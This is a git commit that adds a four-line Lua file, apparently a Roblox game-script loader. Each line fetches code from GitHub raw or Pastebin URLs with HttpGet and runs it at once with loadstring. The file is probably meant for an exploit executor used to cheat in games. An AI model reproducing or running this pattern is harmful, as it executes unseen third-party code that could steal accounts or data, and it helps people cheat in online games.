0e18d51eba9a9386e4c2a7ec143e9b112e924039
modarato <111983974+modarato@users.noreply.github.com>
2022-08-24 20:20:30 +0800

    Create other.lua

---
+++ other.lua
@@ -0,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/modarato/driving-simulator/main/main.lua",true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/vc0TdWRG", true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/BfWKkiDD", true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/7N50MNmn", true))()
